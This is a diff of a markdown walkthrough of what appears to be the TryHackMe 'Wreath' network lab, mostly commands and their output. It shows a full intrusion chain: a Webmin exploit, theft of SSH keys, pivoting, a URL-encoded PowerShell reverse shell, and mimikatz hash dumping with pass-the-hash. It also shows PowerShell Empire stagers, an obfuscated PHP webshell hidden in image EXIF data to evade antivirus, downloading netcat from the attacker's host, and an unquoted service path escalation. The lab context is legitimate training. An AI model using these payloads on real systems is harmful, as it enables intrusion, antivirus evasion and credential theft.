@@ -14,6 +14,8 @@ tags: tryhackme
 # Enumeration
 ## Webserver
 ### Nmap
+
+
 ```console
 ❯ nmap -sC -sV -o -p-15000  10.200.84.200 | tee nmap.log
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 17:32 IST
@@ -49,6 +51,7 @@ No exact OS matches for host (test conditions non-ideal).
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 236.44 seconds
 ```
+
 - Found 4 ports to be open 
 - Found the OS to be CentOS on the host machine
 - The web server is running on MiniServ 1.890 (Webmin httpd) which is vulnerable to CVE-2019-15107
@@ -61,15 +64,21 @@ Nmap done: 1 IP address (1 host up) scanned in 236.44 seconds
 4. *Address* - 21 Highland Court, Easingwold,East Riding, Yorkshire, England, YO61 3QL 
 
 # Exploitaion
+
 ## Web Server
+
 1. Exploited system with `https://github.com/MuirlandOracle/CVE-2019-15107.git`.
 2. The server was found to be running on root, do privelege escalaition was not required. 
 3. Found `id_rsa` file in `/root/ssh/id_rsa`.
 4. Saved key to local machine and gained persistant access to the box
 
 ## Git Server
+
 ### Enumeration
+
 1. Loaded nmap on the compromised machine for further enumeration and scanned all the devices available on the network
+
+
 ```console
 [root@prod-serv tmp]# ./nmap-divu050704 -sn 10.200.90.1-255 -oN scan-divu050704
 
@@ -92,8 +101,13 @@ Nmap scan report for ip-10.200.84.200.eu-west-1.compute.internal (10.200.90.200)
 Host is up.
 Nmap done: 255 IP addresses (5 hosts up) scanned in 3.74 seconds
 ```
+
 2. Found three device runnning on the netowrk apart from the entry point and the comromised device itself.
+
+
 3. On enumerating each device found that some ports were open on the device with ip `10.200.84.150`
+
+
 ```console
 [root@prod-serv tmp]# ./nmap-divu050704 10.200.84.150
 
@@ -113,12 +127,16 @@ MAC Address: 02:2F:36:04:FB:F1 (Unknown)
 Nmap done: 1 IP address (1 host up) scanned in 73.26 seconds
 ```
 ### Exploitation 
+
 1. Pivoted to the network with sshittle
+
 ```console
 ❯ sshuttle -r root@10.200.84.200 --ssh-cmd "ssh -i id_rsa" 10.200.90.0/24 -x  10.200.90.200
 c : Connected to server.
 ```
+
 2. On going to url http://10.200.84.150 found out that the service running was `gitstack`
+
 ```console
 ❯ curl http://10.200.84.150
 
@@ -204,8 +222,11 @@ c : Connected to server.
 </body>
 </html>
 ```
+
 3. On going to `http://10.200.84.150/gitstack` a login screen is presented with displaying default username and password as `admin`, `admin`  respectively, but found out to be changed on this device.
+
 4. Pivoted on the network by loading socat on the compromised machine `10.200.84.200`
+
 ```console
 [root@prod-serv tmp]# ./socat-divu050704 tcp-l:15999 tcp:10.50.91.100:8080 &
 [1] 2337
@@ -215,11 +236,15 @@ c : Connected to server.
 ❯ nc -lvnp 8080
 listening on [any] 8080 ...
 ```
+
 6. Sent the reverse shell command to `10.200.84.150`
+
 ```console
 ❯ curl -X POST http://10.200.84.150/web/exploit-divu050704.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.84.200%27%2C15999%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
 ```
+
 7. Caught the reverse shell and stabalized it 
+
 ```console
 ❯ nc -lvnp 8080
 listening on [any] 8080 ...
@@ -253,8 +278,11 @@ d-----       08/11/2020     13:28                templates_c
 PS C:\GitStack\gitphp> 
 
 ```
+
 8. After pivoting we can access a stable shell with winrm 
+
 9. First on the compromised machine make a new user.
+
 ```console
 PS C:\GitStack\gitphp> net user divu050704 123 /add
 The command completed successfully.
@@ -285,7 +313,9 @@ Path
 ----
 C:\Users\divu050704\Documents
 ```
+
 11. This shell cannot run Administrator commands so we will get a gui session with rdp
+
 ```console
 ❯ xfreerdp /v:10.200.84.150 /u:divu050704 /p:123 /dynamic-resolution /drive:/usr/share/windows-resources,share
 [18:46:18:069] [20044:20045] [INFO][com.freerdp.crypto] - creating directory /home/divu050704/.config/freerdp
@@ -311,7 +341,9 @@ the CA certificate in your certificate store, or the certificate has expired.
 Please look at the OpenSSL documentation on how to add a private CA to the store.
 Do you trust the above certificate? (Y/T/N) Y
 ```
+
 12. On our gui rdb started mimikatz
+
 ```console
 C:\Windows\system32>\tsclient\share\mimikatz\x64\mimikatz.exe
             .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
@@ -321,7 +353,9 @@ C:\Windows\system32>\tsclient\share\mimikatz\x64\mimikatz.exe
            '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
             '#####'        > https://pingcastle.com / https://mysmartlogon.com *** /                                                                                                                                                                               
 ```
+
 13. With mimikatz check that the user is running as Admin
+
 ```console
 mimikatz # privilege::debug
 Privilege '20' OK
@@ -336,7 +370,9 @@ SID name  : NT AUTHORITY\SYSTEM
 * Thread Token  : {0;000003e7} 1 D 1932547     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation(Delegation)                                                                                                                                                               
 
 ```
+
 14. After getting making sure that the user has admin permissions we can no dump password hashes of the users
+
 ```console
 mimikatz # lsadump::sam
 Domain : GIT-SERV
@@ -473,9 +509,11 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> 
 ```
+
 ### Command and Control 
 
 1. Start `powershell-empire` server
+
 ```console
 ❯ sudo powershell-empire server
 [sudo] password for divu050704: 
@@ -515,7 +553,9 @@ Info: Establishing connection to remote endpoint
 [+] Empire RESTful API successfully started
 [+] Empire SocketIO successfully started
 ```
+
 2. Start `powershell-empire` client.
+
 ```console
 ❯ powershell-empire client
 [*] Loading default config
@@ -592,6 +632,7 @@ Hello from the pygame community. https://www.pygame.org/contribute.html
 ```
 
 3. Start listener in the client 
+
 ```console
 (Empire) > uselistener http
 
@@ -725,7 +766,9 @@ exit
 
 [+] Stager copied to clipboard.
 ```
+
 6. We cannot access the gitServer from here so we need to make a connection routing from `.200` to `.150`.
+
 7. Start a new listener `http-hop`, set `host` as `200` and `RedirectListener` as `CLIHTTP`, and Port as `47000`
 ```console
 (Empire) > uselistener http_hop
@@ -833,7 +876,9 @@ exit
 powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAcgBvAHgAeQA9AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARABlAGYAYQB1AGwAdABXAGUAYgBQAHIAbwB4AHkAOwAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBbAEcALAA4ACYAQwBIAF0APAA0AHUAbQB8AFkAVwAvAD4ATQBqADsAZQBYAEwARABwAHcAZABJADoAbABmAFYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBJAFYALwBFAEMAQwBIAHgAUQBiAFMARgB3AFcAVgA5AHEAUgBaADMAQQBOAHAAKwBKAGsASQA9ACIAKQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAEEAQQBMAGcAQQB5AEEARABBAEEATQBBAEEAdQBBAEQAZwBBAE4AQQBBAHUAQQBEAEkAQQBNAEEAQQB3AEEARABvAEEATgBBAEEAMwBBAEQAQQBBAE0AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJABoAG8AcAA9ACcAaAB0AHQAcABfAGgAbwBwACcAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
 [+] Stager copied to clipboard.
 ```
+
 9. After setting up stager, this will create http_hop directory in tmp which we will move to the compromised.
+
 ```console
 # Attacking machine
 ❯ cd /tmp && zip -r http_htop.zip http_hop
@@ -857,13 +902,16 @@ Archive:  http_hop.zip
   inflating: http_hop/admin/get.php  
 [root@prod-serv hop-divu050704]# ls
 ```
+
 10. Open port in firewall of the compromised machine `.200`
+
 ```console
 [root@prod-serv hop-divu050704]# firewall-cmd --zone=public --add-port 47000/tcp
 success
 ```
 
 11. Host the set of files in hop via php
+
 ```console
 [root@prod-serv hop-divu050704]# php -S 0.0.0.0:47000 &
 [3] 2372
@@ -872,7 +920,9 @@ Listening on http://0.0.0.0:47000
 Document root is /tmp/hop-divu050704
 Press Ctrl-C to quit.
 ```
+
 12. Then with burpSuite send the command recieved above to the earlier places web_exploit.
+
 ```php
 POST /web/exploit-divu050704.php HTTP/1.1
 Host: 10.200.84.150
@@ -884,7 +934,9 @@ Connection: close
 Upgrade-Insecure-Requests: 1 
 Content-Type: application/x-www-form-urlencoded a=powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAcgBvAHgAeQA9AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARABlAGYAYQB1AGwAdABXAGUAYgBQAHIAbwB4AHkAOwAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBbAEcALAA4ACYAQwBIAF0APAA0AHUAbQB8AFkAVwAvAD4ATQBqADsAZQBYAEwARABwAHcAZABJADoAbABmAFYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBGAGgAVQBCAGMAbgB5AFcANABIAGgAVgBpAGMAOQBYAG8AQwBPAHIAZwBxAEgAdAA2AHAATQA9ACIAKQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAEEAQQBMAGcAQQB5AEEARABBAEEATQBBAEEAdQBBAEQAZwBBAE4AQQBBAHUAQQBEAEkAQQBNAEEAQQB3AEEARABvAEEATgBBAEEAMwBBAEQAQQBBAE0AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABoAG8AcAA9ACcAaAB0AHQAcABfAGgAbwBwACcAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
 ```
+
 13. Recieved agent from the listner and interact
+
 ```console
 (Empire: agents) > agents
 
@@ -905,7 +957,9 @@ Content-Type: application/x-www-form-urlencoded a=powershell -noP -sta -w 1 -enc
 NT AUTHORITY\SYSTEM
 ```
 ### Personal PC
+
 1. Connect with `evil-winrm` with scripts loaded :gun: 
+
 ```console
 ❯ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
 
@@ -917,7 +971,9 @@ Data: For more information, check Evil-WinRM Github: https://github.com/Hackplay
 
 Info: Establishing connection to remote endpoint
 ```
+
 2. Then Import Invoke-Portscan.ps1 and use it.
+
 ```console
 *Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan.ps1 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.84.150 -TopPorts 50
@@ -931,7 +987,9 @@ filteredPorts : {}
 finishTime    : 8/31/2022 7:36:57 AM
 
 ```
+
 3. Pivoted network with chisel
+
 ```console
 # Compromised machine
 *Evil-WinRM* PS C:\Users\Administrator> netsh advfirewall firewall add rule name="Chisel-divu050704" dir=in action=allow protocol=tcp localport=15997
@@ -942,19 +1000,26 @@ chisel-divu050704.exe : 2022/09/02 13:44:14 server: Fingerprint IgXizVmVfO9eilua
     + FullyQualifiedErrorId : NativeCommandError
 2022/09/02 13:44:14 server: Listening on http://0.0.0.0:15997
 ```
+
 4. After  connecting open firefox with foxyproxy
+
 ```
 IP- 127.0.0.1
 PORT - 5005
 ```
+
 5. Go to the ip `10.200.84.100` and start vappalyzer and found that the website was running `php 7.4.11`
+
 6. Now on Winrm find the GitServer directory and download it to the local machine
+
 ```console
 *Evil-WinRM* PS C:\GitStack\repositories> download C:\Gitstack\Repositories\Website.git Website.git
 Info: Downloading C:\Gitstack\Repositories\Website.git to ./C:\Gitstack\Repositories\Website.git Website.git
 
 ```
+
 7. Clone GitTools repository 
+
 ```console
 ❯ git clone https://github.com/internetwache/GitTools
 Cloning into 'GitTools'...
@@ -965,9 +1030,13 @@ remote: Total 242 (delta 9), reused 27 (delta 7), pack-reused 209
 Receiving objects: 100% (242/242), 56.46 KiB | 342.00 KiB/s, done.
 Resolving deltas: 100% (88/88), done.
 ```
+
 8. Rename the folder to .git inside Website.git
+
 9. Move GitTools to `Website.git`
+
 10. Extract the repository from `.git` file retrieved
+
 ```console
 ❯ GitTools/Extractor/extractor.sh . Website
 ###########
@@ -1001,7 +1070,9 @@ GitTools  Website
 1-345ac8b236064b431fa43f53d91c98c4834ef8f3
 2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
 ```
+
 11. Read all the commits with script
+
 ```console
 ❯ separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
 
@@ -1043,9 +1114,13 @@ Initial Commit for the back-end
 ❯ find . -name "*.php"
 ./resources/index.php
 ```
+
 14. On reading the index.php file found that there are two `||` statements the first check whether the uploaded file is image or not.
+
 15. In the second statement the code only checks index `[1]`, this means that a website with 2 file extentions can bypass the filter e.g., `code.jpg.php`.
+
 16. Downloaded a random file and add test code to the file in comments with exiftool
+
 ```console
 ❯ exiftool test-divu050704.jpg.php
 ExifTool Version Number         : 12.44
@@ -1120,10 +1195,15 @@ Megapixels                      : 8.3
 Thumbnail Image                 : (Binary data 2127 bytes, use -b option to extract)
 
 ```
+
 17. Go to `http://10.200.84.100/resources` you will prompted with a username and password the username we found for the gitStack was thomas and password hash we retrieved from `mimikatz` gave the password `i<3ruby`
+
 18. Now upload the image.
+
 19. Go to `http://10.200.84.100/resources/uploads/test-divu050704.jpg.php` and you will be prompted with test string we uploaded.
+
 20. Now we can upload a shell which can run commands in a form of parameter
+
 ```php
 <?php
     $cmd = $_GET["wreath"];
@@ -1133,27 +1213,38 @@ Thumbnail Image                 : (Binary data 2127 bytes, use -b option to extr
     die();
 ?>
 ```
+
 21. But we need to [obfuscate](https://www.gaijin.at/en/tools/php-obfuscator) this payload to pass the AntiVirus System onboard.
+
 ```php
 <?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>
 ```
+
 22. Then we will exit dollar sogns so that it is not executed as commands in our own system.
+
 ```php
 <?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>
 ```
+
 23. Then we will insert this code into an image file for uploading.
+
 ```console
 ❯ exiftool -Comment="<?php \$h0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$h0)){echo base64_decode('PHByZT4=').shell_exec(\$h0).base64_decode('PC9wcmU+');}die();?>" shell-divu050704.jpg.php
 ```
+
 24. After uploading file we can run commands by going to the image and adding parameter as `?wreath=COMMAND`.
+
 25. Now we will try to get a complete reverse shell from the machine, but we cannot do so because the windows antivirus system can find a reverse-shell powershell command so we will upload  a static copy of netcat on the system.
+
 ```console
 # Attacking machine
 ❯ sudo python3 -m http.server 80
 # Url
 http://10.200.84.100/resources/uploads/shell-divu050704.jpg.php?wreath=curl%20http://10.50.85.113:80/nc.exe%20-o%20c:\\windows\\temp\\nc-divu050704.exe
 ```
+
 26. After uploading static netcat file we can start a reverse shell.
+
 ```
 # Attacking machine
 ❯ nc -lvnp 443
@@ -1169,7 +1260,9 @@ Microsoft Windows [Version 10.0.17763.1637]
 
 C:\xampp\htdocs\resources\uploads>
 ```
+
 27. Check priveleges for the current user
+
 ```console
 C:\xampp\htdocs\resources\uploads>whoami /priv
 whoami /priv
@@ -1184,7 +1277,9 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
+
 28. Check group information of the user.
+
 ```console
 C:\xampp\htdocs\resources\uploads>whoami /groups
 whoami /groups
@@ -1205,7 +1300,9 @@ LOCAL                                Well-known group S-1-2-0      Mandatory gro
 NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
 ```
+
 29. This user is not in the administrator group, so we will check for running services for any vulnerabilites.
+
 ```console
 C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
 wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
@@ -1223,8 +1320,11 @@ Windows Defender Antivirus Service                                              
 Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                        Manual
 
 ```
+
 30. We found a service `SystemExplorerHelpService` with no parenthesis so we will try to use `Unquoted Service Path Attack` on this service.
+
 31. Then we will check under which account is it running.
+
 ```console
 C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
 sc qc SystemExplorerHelpService
@@ -1242,8 +1342,11 @@ SERVICE_NAME: SystemExplorerHelpService
         SERVICE_START_NAME : LocalSystem  <---account name for the service
 
 ```
+
 32. The service is running under the account name of `LocalSystem`.
+
 33. We can now check whether we have writing permission to the directory.
+
 ```console
 C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
 powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
@@ -1274,8 +1377,11 @@ Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)
          ;;S-1-15-2-2)
 
 ```
+
 34. Now we will make our own `.exe` file to replace the original service and swap it with a reverse shell code.
+
